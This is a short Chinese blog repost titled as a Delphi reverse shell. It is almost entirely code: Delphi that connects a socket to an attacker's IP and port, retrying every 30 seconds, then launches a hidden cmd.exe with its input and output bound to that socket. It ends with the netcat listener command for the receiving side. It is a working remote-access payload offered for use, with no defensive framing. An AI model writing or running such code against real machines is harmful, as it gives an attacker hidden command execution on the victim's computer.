---
published: true
---
---


# gelphi反向shell
转载，原文链接[传送门](http://www.5ecurity.cn/index.php/archives/150/)

```delphi
sock :TSocket;      //定义socket
sin :TSockAddrIn;   //定义sockaddr_in结构

//初始化并创建socket
sock :=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, nil, 0, 0);

//设置socket参数
sin.sin_family :=AF_INET;
sin.sin_port :=htons(port);
sin.sin_addr.s_addr :=inet_addr(ip);

//调用connect连接反弹地址
while (connect(sock,sin,sizeof(sin))<>0) do Sleep(30000);
```

```delphi
si :TStartupInfo;       //定义STARTUPINFO结构体
pi :TProcessInformation;   //定义PROCESS_INFORMATION结构体

ZeroMemory(@si, SizeOf(si));  //si清零

//si赋值
si.cb :=sizeof(si);
si.dwFlags :=STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
si.wShowWindow :=SW_HIDE;

//下面这三个是将输入、输出、报错信息都绑定到socket上
si.hStdInput :=sock;
si.hStdOutput :=sock;
si.hStdError :=sock;

//创建命令执行进程
CreateProcess(nil,'cmd.exe',nil,nil,TRUE,CREATE_NEW_CONSOLE,nil,nil,si,pi);
```


```bash
nc -lv -p [port]  //服务端监听
```
